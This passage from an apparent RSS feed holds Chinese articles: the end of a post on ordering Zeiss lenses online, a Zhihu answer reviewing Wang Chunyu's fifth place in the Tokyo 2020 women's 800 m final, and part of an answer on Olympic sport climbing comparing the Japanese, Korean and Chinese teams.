src=\"https://cdn.sspai.com/2021/08/03/e330dda228f495beb3438a91a173a682.png\"></figure><p>最后，简单总结一下我这次的配镜流程：</p>\n<ol>\n<li>选定自己需要的镜片，如果是定制片，同时确定所需的定制参数；</li>\n<li>准备好验光处方和定制参数数据。在我自己的例子里，我通过蔡司小程序找到了本地的合作眼镜店，付费进行了验光和定制参数测量；</li>\n<li>和线上卖家沟通，确定配镜参数，下单镜片并选择原厂加工；</li>\n<li>邮寄镜架给卖家，等待装配；</li>\n<li>收货，检查镜片包装并试戴，确认眼镜装配正常。</li>\n</ol>\n<p>下单并寄出镜架十天后，我收到了装配完成的眼镜。最大的感受是，智锐对于屏幕的优化确实名不虚传，和之前使用的折射率相同的 JINS 普通镜片相比，智锐用来看近处的手机和电脑屏幕可以明显感觉到视野变大和清晰明亮了，眼睛的适应也比看远景快了一天左右（整体上，我完全适应新镜片大约花了三天时间），看非屏幕的其他场景虽然没用显著的惊艳，但也非常清晰明亮，对于眼镜，如果能够让你尽可能感觉不到它的存在，那就是一副好眼镜吧。</p>\n<hr>\n<p>参考文章</p>\n<ul>\n<li><a href=\"https://idei.nju.edu.cn/22/0f/c26392a533007/pagem.htm\">《打造县域特色产业：丹阳眼镜产业的阶段性探索与启示》</a></li>\n<li><a href=\"http://report.iresearch.cn/report/202101/3718.shtml\">《2020 年中国眼镜镜片行业白皮书》</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/264765611\">《从消费者角度谈眼镜片的选择》</a></li>\n<li><a href=\"https://wsgzao.github.io/post/glasses/\">《作为程序猿我为什么选择了一副比 A4 纸还轻的眼镜》</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/20218552\">《验光 3.0 时代的检查项目（二）》</a></li>\n<li><a href=\"https://family.pconline.com.cn/1271/12717530.html\">《这可能是最严苛的眼镜片横评：100 到 1000 元的差距在哪里？》</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/68035"},{"title":"如何评价 2020 东京奥运会田径女子 800 米决赛王春雨创个人最好成绩获第 5 ？","date":"2021-08-05 06:15:55","description":"\n<p>赛后知道一个小细节，更加理解为何昨天王春雨从赛后直到媒体混采区，一直都在抽泣——她说，<b>自己赛前已经偷偷准备好了领奖服。</b></p>\n<p>尽管可能没有多少人（哪怕是自己人），会相信她能最终站台。</p>\n<p>带着眼泪的「个人最佳」和「创造历史」，特别令人动容。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"2016年里约奥运，王春雨1分59秒93首次晋级奥运半决赛；2020东京奥运会，则再一次提升，跻身决赛并位列第五。图/Lucy Nicholson\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><br></p>\n<p>女子800米决赛的八名选手在昨天都是超水准的发挥，6人创造了PB（个人最佳）、1人创造了SB（赛季最佳）。包括冠军是美国新国家纪录（1分55秒21）、亚军是英国国家纪录（1分55秒88）。</p>\n<p><b>在这样一场几乎所有选手都拿出自己110%实力的「PB决战」中，王春雨的1分57秒00、第五名的成绩，含金量极高极高。</b></p>\n<p>对她个人来说，也是继半决赛后三天时间再次大幅PB，很厉害。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-caf7708210c60d1c1687b047e25ddb5f_720w.jpg?rss\" data-caption=\"NR是国家纪录，PB是个人最好成绩，SB是该选手本赛季最好成绩\" data-size=\"normal\" data-rawwidth=\"1748\" data-rawheight=\"630\" data-watermark=\"watermark\" data-original-src=\"v2-caf7708210c60d1c1687b047e25ddb5f\" data-watermark-src=\"v2-1631582542cd69aa97afbddacfa1317c\" data-private-watermark-src=\"v2-386ec9984fe4cf0526965c30d6b5df70\"></p>\n<p><br></p>\n<p>赛后王春雨说了一番话，</p>\n<p>“（第五）证明了自己是可以的，但还是遗憾没能站上领奖台。也许是自己水平不够，跟她们还有差距。”</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<hr>\n<p>复盘一下王春雨的东京奥运会之旅。</p>\n<p><br></p>\n<h3>7月30日第一轮，2分00秒05，小组第三晋级半决赛</h3>\n<p>王春雨东京奥运会前表现出的状态非常好，赛前20天曾在杭州跑过一场邀请赛，轻松跑出1分59秒18——<b>这是自1997年上海八运会以来、中国女子800米的最好成绩。</b></p>\n<p>这场比赛对王春雨来说只是奥运前的最后热身赛，并不算完全展现实力，也可见王春雨当下的状态和能力。</p>\n<p>东京的第一轮和半决赛只相隔一天，王春雨也尽量会以最低的消耗确保自己晋级、并在半决赛发挥。最终2分00秒05，小组第三，顺利晋级半决赛。</p>\n<p><br></p>\n<p>5年前的里约，王春雨已经晋级过奥运半决赛，当时她的实力和目标就是半决赛，第一轮就得全力输出（1分59秒93），到了半决赛位列小组第八（2分04秒05）。东京奥运会王春雨不管能力和目标显然都要远得多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-91a07c34349015a138ad9285d8497c65_720w.jpg?rss\" data-caption=\"里约时，王春雨力拼进入半决赛，第一轮已经全力输出，最终半决赛2分04秒05小组第八\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"349\" data-watermark=\"watermark\" data-original-src=\"v2-91a07c34349015a138ad9285d8497c65\" data-watermark-src=\"v2-147bc558c219281709e80bfade701efd\" data-private-watermark-src=\"v2-ec7cccb094bbd797ae8ec4244083b753\"></p>\n<p><br></p>\n<h3>7月31日半决赛，1分59秒14，小组第二晋级决赛</h3>\n<p>前400米59秒5（第一）、后400米59秒6（最终小组第二），1分59秒14小幅刷新个人PB，小组仅落后基利·霍奇金森0.02秒（基利最终决赛拿了银牌）。</p>\n<p>顺利进入决赛。</p>\n<p><b>首位进入奥运会女子800米决赛的中国运动员，第二位进入决赛的亚洲选手——这个第二让整个亚洲等了近百年，上一次要追溯到1928年阿姆斯特丹奥运会的人见绢枝</b>（当时21岁的日本人人见绢枝拿了银牌，可惜她因为肺结核24岁就去世了）。</p>\n<p>后面是三天后的决赛。</p>\n<p><br></p>\n<h3>8月3日决赛，1分57秒00，第五</h3>\n<p>决赛对王春雨就是拼。这种拼甚至还有破釜沉舟的意味在里面，包括她不断给自己一些暗示，剑指名次、冲击领奖台——这也是很多人（包括我们自己人）兴许都并没有对王春雨报以如此高的期望，王春雨自己却有更高的要求。</p>\n<p><br></p>\n<p>一个细节，完成半决赛后王春雨还和记者开玩笑说，“下一场（决赛）我走完两圈也是第八了，<b>但我觉得我不可能是第八，我想拼一个更好的名次。</b>”</p>\n<p>最后看，这种高要求没有变为负担，相反成了很强的驱动力。</p>\n<p>特别棒。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-daf4159d3d5b7eb309f15164eca6983b_720w.jpg?rss\" data-caption=\"东京奥运会中国不少女选手都有自己的幸运小细节，比如杨倩的小黄鸭头饰、美甲，比如鲍珊菊/钟天使的毛主席佩章等，王春雨的幸运符就是红色蝴蝶结。\" data-size=\"normal\" data-rawwidth=\"2170\" data-rawheight=\"3000\" data-watermark=\"watermark\" data-original-src=\"v2-daf4159d3d5b7eb309f15164eca6983b\" data-watermark-src=\"v2-1293107dfbeaf2318a16ea47af1ab424\" data-private-watermark-src=\"v2-d611ed594dab7610a9c0ce8ef42585bd\"></p>\n<p><br></p>\n<p>解读一下决赛：</p>\n<p><br></p>\n<p>决赛王春雨第二道出发；</p>\n<p>800米内道选手，如果想争夺名次的话，并道后需要特别留意不能被外道选手给卡在里面，这样后面的突围和冲刺很容易失去自己的节奏。王春雨也是很担心这一点，所以并道后，她是想跟住美国人穆的（后来的冠军，1分55秒21）。不过并没能跟到穆后面；</p>\n<p>——看过比赛的应该会有印象，外圈选手并道的瞬间是很“凶”的，并道也是特别的决绝；</p>\n<p>此后王春雨的位置一直在3-5名间左右，<b>比赛前400米58秒2、排名第四</b>；</p>\n<p>比赛后半程看的很振奋。<b>王春雨中后段（大约600米处）有落到后面，一度让人觉得是不是就此会被落下</b>；</p>\n<p>然后她还是咬牙跟住了；</p>\n<p><b>迎来最后100米直道冲刺时，她的排名回到第六、在内道的位置。最后90米，王春雨突然很坚决的选择往外跑，转到了第三道开始最后冲刺</b>；</p>\n<p>后半程的落后，也是王春雨与穆、基利等选手实力差距的呈现。但王春雨丝毫没有稳妥完赛的意思，真的是毫无保留的拼了最后这段；</p>\n<p>美国的天才少女、19岁的穆最后和别人的差距越拉越大如愿第一个冲线。当时转播画面里王春雨也是大跨步的在冲，完全没有松懈；</p>\n<p>最后第五名完赛，落后铜牌罗杰斯0.18秒、第四简玛·里基0.1秒，其实互相之间的差距并不大。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b605f4ddb69994aa8a4c588d4ae417e8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2824\" data-rawheight=\"1796\" data-watermark=\"watermark\" data-original-src=\"v2-b605f4ddb69994aa8a4c588d4ae417e8\" data-watermark-src=\"v2-5dac5fc7d14ae975750ce64bd49e6d15\" data-private-watermark-src=\"v2-13249668e591f538b21400f4a57b3a42\"></p>\n<p><br></p>\n<p><b>1分57秒00，比自己三天前跑出的个人PB提升了整整2.14秒</b>，这显然是很超神的表现了——主观来讲，这种超神表现给予的震撼丝毫不亚于苏炳添前几天的9秒83。</p>\n<p>甚至于，可能是赛后到写这个回答、刚刚重新看遍比赛，以及王春雨自己的赛后复盘，还产生更多“好可惜啊”的感觉……</p>\n<p><br></p>\n<p>决赛的八位选手发挥真的都很出色，互相之间的竞争角逐也让每个人都跑出了很快的成绩。“其他人表现一般，王春雨这个发挥是否就拿牌了？”的假设客观来说，本质并不成立。</p>\n<p>这点要承认。</p>\n<p>也无法去奢求或者假象，如果王春雨跑得更快一些会怎样。这个26岁安徽姑娘，已经完全输出了自己的能力。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3d373ba77d7bf67268d5e24a1c2efd0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5000\" data-rawheight=\"3333\" data-watermark=\"watermark\" data-original-src=\"v2-f3d373ba77d7bf67268d5e24a1c2efd0\" data-watermark-src=\"v2-5d5fa3872bea66d5b87f43e28501ddb8\" data-private-watermark-src=\"v2-1a2740533e0ce38823d5926f47c21c49\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3df88e9dbadcf260482f6ccfd24c35e4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-3df88e9dbadcf260482f6ccfd24c35e4\" data-watermark-src=\"v2-e51fb00d57685dac7da7a313053d7db1\" data-private-watermark-src=\"v2-135681aaaa064958b3b3ac7e1f0f0682\"></p>\n<p><br></p>\n<p>王春雨亚锦赛、亚运会都已拿到过第一名，两届奥运会，里约和东京也已经最好的证明了自己的实力。</p>\n<p>三年后的巴黎奥运会，很难想象王春雨还会站上决赛。不过对东京赛后王春雨的这句话，还是坚信不疑——</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<p><br></p>\n<p>不光你觉得，我们也这样觉得。一定会的。</p>\n<p>兴许明年的杭州亚运会，王春雨依然会（在成绩上）更进一步。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">121 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/477050158?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价东京奥运会王春雨在800米决赛中的表现？</a><br><a href=\"http://www.zhihu.com/question/475915462?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会体操女子个人全能决赛唐茜靖第 7 芦玉菲第 18 ？</a><br>\n","link":"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价街舞（breaking）、滑板、攀岩和冲浪正式成为 2024 年巴黎奥运会比赛正式项目?","date":"2021-08-05 06:15:47","description":"\n<p>东京奥运会攀岩预赛结束更新：</p>\n<p>中日韩三国赛果如下：</p>\n<p>男子组：中国的小将潘愚非速度赛排名第20位，抱石赛排名第8位，难度攀登比赛排名第7位，最终总成绩第14位，无缘决赛；</p>\n<p>日本队，一哥Tomoa Narasaki发挥出色，不专攻速度赛的他爬出了5.94秒位居第2，抱石赛也高居第2，在基本已经确保晋级的情况下难度攀登轻松上阵排名第14，总成绩第2位进入决赛。另一名选手Kai Harada总成绩排名第18位，无缘决赛；</p>\n<p>韩国队唯一的入围选手Jongwon Chon排名第十与决赛失之交臂。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-86204dbc607449903f154aee883cf4a6_720w.jpg?rss\" data-caption=\"中国选手潘愚非在抱石比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1349\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：专攻速度的中国小将宋懿龄速度赛爬出了6.46秒的好成绩，位居第3位，但是受到肩伤影响的她抱石赛排名第19位，难度攀登比赛排名第18位，最终总成绩第12位无缘决赛；</p>\n<p>日本队，老将Akiyo Noguchi和中生代选手Miho Nonaka分别以总成绩第4位和第3位晋级，毫无悬念；</p>\n<p>韩国队的天才少女Chae-hyun Seo在速度赛仅仅爬出第17名的情况下，抱石赛取得第5名，难度攀登更是豪取第1名，以总成绩第2名的成绩挺进决赛。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-acd6f6881d2abd2e952bf049c4afe3b1_720w.jpg?rss\" data-caption=\"中国选手宋懿龄在速度比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1514\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>资格赛，中日韩三方的表现基本在笔者的预测范围内。中国两位小将其实需要发挥出自己的全部实力，加上一些些运气才可以晋级。只不过，潘愚非的速度赛稍微欠缺了一些运气，宋懿龄受到奥运会资格赛期间肩伤的影响并没有完全恢复，在战略性放弃抱石赛保存体力避免受伤的情况下难度攀登还是未能克服伤病影响。但是这一次他们的表现已经足够出色，中国的攀岩水平还在不断上升，让我们期待2024年巴黎奥运会速度攀岩和其他两项分开之后，这两位选手和其他中国选手的表现。</p>\n<p>这次奥运会，大家都是时隔很久看到大多数选手登场，所以也是对他们闭关修炼的一个检验。很明显日本队对于速度攀岩的训练得到了回报，潘愚非和韩国的小将Chae-hyun Seo也加强巩固了自己的抱石水平。</p>\n<p>今明天将是男子组和女子组的决赛，祝大家观赛愉快，享受比赛。</p>\n<hr>\n<p>攀岩项目首次进入了奥运，一众岩友的很多回答已经说到了攀岩的方方面面。攀岩首次入奥，中国国家队也是首次建立了一支优秀的攀岩队伍。这支国家队新队伍的诞生引起了我的关注。</p>\n<p>我就稍微聊聊选手，特别是着重聊一下中日韩三国的选手吧。</p>\n<p>中日韩三国在体坛也算相爱相杀多年，并且横跨多个体育项目，足球，篮球，排球，乒乓球，游泳，围棋，并且出现了很多个口口相传的动人故事。现在运动攀岩也进入了奥运大家庭，也算是为这三个国家之前的体育项目比拼又增添的新的一笔。</p>\n<p>笔者个人认为，在现在的攀岩大环境下，中日韩三国之间的关系跟早年的围棋大环境有相似之处：日本实力统治，韩国正在悄悄开始新时代，而中国目前无疑是三个国家中相对较弱的国家，但是前景无疑是光明的…</p>\n<p>先从最强大的日本开始说起。</p>\n<p><b>日本队 </b></p>\n<p><b>关键词：内卷</b></p>\n<p>提起日本队，笔者第一个会想到的是一个最近开始很流行的词语——内卷。</p>\n<p>日本队无疑是全亚洲，乃至于全世界，综合攀岩实力最强的国家。</p>\n<p>日本队有多强？我们用2019年国际攀联世界杯的各个分站赛数据来说话。为什么选用2019年？是因为2019年的时候攀岩在奥运会的比赛方式已经确定（综合），以及各位选手在2019国际攀联世界杯的积分将会被作为奥运资格的选拔方式之一，所以全世界的所有攀岩选手对2019年国际攀联世界杯都非常重视，而且在2019年，在日本的八王子分站赛，第一次出现了按照奥运会标准的综合比赛方式。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛男子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0787fa3caba4cc402ecb346ab76c7f9c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-0787fa3caba4cc402ecb346ab76c7f9c\" data-watermark-src=\"v2-63bc8a1d1ce147513cdefda09c428f54\" data-private-watermark-src=\"v2-acf6b6226900ce3763b9067ef1f86e42\"></p>\n<p>可以看到，除了德国慕尼黑站日本队稍显拉垮，没有成员进入前六以外，有两次分站赛有两人进入决赛，有两次分站赛有三人进入决赛，有两次分站赛有四人进入决赛，这个数目放眼任何一个国家都是统治级的。七次有三次冠军落入日本队手中。其中的两次冠军，由目前的日本男子第一人，外号“日本一哥”的Tomoa Nagasaki的获得。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛女子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d3bc4372fbb74528aa2106f36879e46a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-d3bc4372fbb74528aa2106f36879e46a\" data-watermark-src=\"v2-8262650633aaacd31ef707da0ba7e08b\" data-private-watermark-src=\"v2-365ae70b09e30b66a2ab560dffa5364c\"></p>\n<p>相比男子组，女子组的统治力也并没有逊色，只是由于2019年是斯洛文尼亚选手Janja Garnbret状态爆炸的一年，日本女队难夺一冠。一直被Janja压制的这位日本选手，正是老来焕发第二春，状态更胜壮年的日本女子第一人，Akiyo Noguchi。</p>\n<p>相比抱石被日本队统治，先锋和速度攀岩相对百花齐放一些。那么，综合这三项考核的攀岩比赛，日本队会不会因此受到影响呢？</p>\n<p>结论是…是的，日本队受到了影响，统治力更加强大了。以下是八王子站综合排名：</p>\n<p>男子组：</p>\n<p>冠军归属日本，前六名四位日本选手。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-e82d31bb2d8c1d3729336f9a55d3ffed_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"363\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：</p>\n<p>最好成绩亚军，前六名三位日本选手。 </p>\n<p>所以在攀岩界，有着世界对抗日本的传说…</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8342ad202823b2e9c6e2b927fb85b8a8_720w.jpg?rss\" data-caption=\"网上的调侃世界对抗日本的攀岩表情包\" data-size=\"normal\" data-rawwidth=\"929\" data-rawheight=\"495\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>那么，为什么我要用内卷来形容日本队呢？</p>\n<p>那是因为攀岩奥运名额的问题。由于奥运攀岩比赛的选手人数只有男女各二十人，为了防止一边倒的局面，世界攀联规定，每个国家的名额上限，至多两男两女一共四位选手。</p>\n<p>由于Tomoa和Akiyo在2019年国际攀联世界杯的优异表现，他们各自锁定了一个奥运名额</p>\n<p>由于日本队是东道主，所以还能自动获得一男一女两个名额——事实上，我觉得日本队并不需要东道主这个便利，凭借接下来两位选手（男生Kai Harada和女生Miho Nonaka）的优异表现，也照样能够顺延获得两个奥运名额。</p>\n<p>然而，剩下的一众日本选手，尽管他们的实力可能还强于不少获得奥运资格的其他国家的一些选手，但是因为名额限制，只能遗憾无缘这次奥运。可以说，许多出色的日本攀岩选手们，有着和许多出色的中国乒乓球选手们，有着相似的痛苦。这次疫情之后，日本先于其他国家办起了国内锦标赛，由于比赛荒，日本锦标赛获得了全世界岩友们的空前关注。比赛水平之高，颇有几分我国乒乓球「直通里约热内卢」之类比赛的即视感。</p>\n<p>下面介绍一下一些日本选手：</p>\n<p>奥运选手：Akiyo Noguchi</p>\n<p>这次攀岩入奥，正好赶上了东京奥运会。在当年，得知攀岩有机会加入2020年奥运会之时，当仁不让日本的女子攀岩第一人，Akiyo Noguchi，积极参与了东京申奥的活动。Akiyo其实相对于攀岩选手来说，年纪已经不算轻，她之前也有过2020年之前就退役的打算。但是，在活动中她表示，只要东京获得了2020年奥运会的承办资格，她肯定会积极训练，备战2020东京奥运，在为国效力之后再退役。随着东京申办奥运的成功，Akiyo也实现了自己的梦想。在2018年开始的一系列比赛之中，Akiyo状态爆炸，不仅实现了第二春，并且成绩更胜往昔。早年Akiyo是以柔韧著称，经常出现脚比头高的极限挂脚动作，然而到了职业生涯末期，Akiyo进一步雕琢自己的风格，在动态动作方面取得了长足进步，从动态来说已经是稳稳的世界顶尖水准。然而疫情的降临，让东京奥运推迟至2021年，Akiyo的年龄也来到了31岁，在疫情后的比赛已经出现了明显的状态下滑，不禁让人唏嘘。希望她能够保持状态，能够在奥运比赛中取得理想的成绩。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2004f98c02e63c19d3bb47b02b015893_720w.jpg?rss\" data-caption=\"日本一姐Akiyo Noguchi在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"499\" data-watermark=\"watermark\" data-original-src=\"v2-2004f98c02e63c19d3bb47b02b015893\" data-watermark-src=\"v2-190d0b644211b55f1fa6fa91119df678\" data-private-watermark-src=\"v2-886f72bec4cb1719ef50b87a2e124927\"></p>\n<p>奥运选手：Tomoa Naarasaki</p>\n<p>日本一哥，动态之王，能够跳的时候绝对不静态，已经形成了自己鲜明的风格。其实Tomoa在户外攀岩的时候，其静态动作也是非常精准的，只是在竞技攀岩中，他选择了使用动态方法来完成而已。攀岩的先锋比赛有六分钟的时间限制，但是Tomoa无论能不能把线路爬完，基本上花费的时间都在三分钟以内，人狠话不多。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d00f33f0012a46c56e20d6c9d2c2424_720w.jpg?rss\" data-caption=\"Tomoa Naarasaki登顶后的标志性动作。图源：Japan Times\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1315\" data-watermark=\"watermark\" data-original-src=\"v2-4d00f33f0012a46c56e20d6c9d2c2424\" data-watermark-src=\"v2-cae801cafd39781888cc01e6bc11ee8e\" data-private-watermark-src=\"v2-c07c7fb8e0a18879f379181427c311ae\"></p>\n<p>奥运选手：Miho Nonaka</p>\n<p>Miho是当仁不让的日本女子攀岩第二人，跟Akiyo颇有一种「既生瑜，何生亮」的味道。除了在2018年世界攀联锦标赛拿了年度世界冠军（Akiyo是年度世界亚军），其余时候基本上是被Akiyo稳压一头（就连2018年也是拿了无数亚军屈居Akiyo之后在某一次比赛绝地翻盘）。坊间传言Miho和Akiyo，以及一些其他日本队成员的关系并没有很好，这点笔者没有特意求证，但是相比于日本队其他选手的其乐融融，Miho颇有种苦大愁深的味道，训练刻苦，甚至还号召日本民众给自己众筹了一个私人的速度攀岩赛道。相比其他选手Miho经常在Instagram发自己的训练视频，并且经常给自己打鸡血，灌鸡汤，不得不让人瑞斯拜。也希望Miho的努力能够取得回报。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2fcb9fbd06b4828bcd59ebcfcbbaafda_720w.jpg?rss\" data-caption=\"Miho Nonaka在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"463\" data-watermark=\"watermark\" data-original-src=\"v2-2fcb9fbd06b4828bcd59ebcfcbbaafda\" data-watermark-src=\"v2-ce96197fd0e3b257b3a7bbda6a06c6d0\" data-private-watermark-src=\"v2-06d4b7804cd10a398bec0a35cc653bca\"></p>\n<p>奥运遗珠：Futaba Ito</p>\n<p>Futaba是一位青少年选手——今年不过19岁。笔者从她16岁就开始关注了，是一位非常可爱的小姑娘。她一直是Akiyo的小跟班，其实也算是Akiyo的徒弟。相比Akiyo和Miho，Futaba多多少少有些稚气未脱，发挥时好时坏，在总成绩上比两位一姐二姐还是略显逊色。但是这两年随着成年，Futaba的力量也有了很大增长，整个人看上去大了一圈。等到Akiyo退役，相信Futaba通过也可以顺势上位，和Miho稳坐日本女队前两把交椅。不过日本年轻一代好手太多，也可能随着Akiyo的退役进入群雄割据的时代，未来如何就看Futaba自己的努力了。</p>\n<p><b>韩国队</b></p>\n<p><b>关键词：传承</b></p>\n<p>虽然比不上日本队可以对抗世界，但是韩国队绝对是亚洲范围乃至世界范围内的一支劲旅。其中有一个原因，是韩国队拥有全世界竞技攀岩第一人，或者说，世界攀联锦标赛成绩第一人，Jain Kim。是的，笔者在这里用了第一人这个词，并且没有加之一，没有限定性别。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2fd41eb66bb1344dc65fd8ba0e9239ac_720w.jpg?rss\" data-caption=\"最优雅的岩者之一，Jain Kim。图源：ifsc\" data-size=\"normal\" 